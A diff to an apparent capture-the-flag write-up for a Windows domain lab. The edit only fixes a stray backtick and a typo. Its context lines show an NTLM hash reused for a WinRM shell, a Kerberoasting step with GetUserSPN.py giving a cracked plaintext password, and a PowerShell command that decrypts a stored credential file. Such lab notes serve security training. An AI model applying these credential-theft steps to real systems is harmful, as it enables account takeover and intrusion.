@@ -124,6 +124,6 @@ from here find ljudmilas hash for a winrm shell f220d3988deb3f516c73f40ee16c431d
 
 use GetUserSPN.py and get a hit for xyan1d3:cyanide9amine5628
 ```bash
-$Credential = Import-Clixml -Path "xyan1d3.xml"   $Credential.GetNetworkCredential().password`
+$Credential = Import-Clixml -Path "xyan1d3.xml"   $Credential.GetNetworkCredential().password
 ```
-will give the userpassword
+will give the user's password
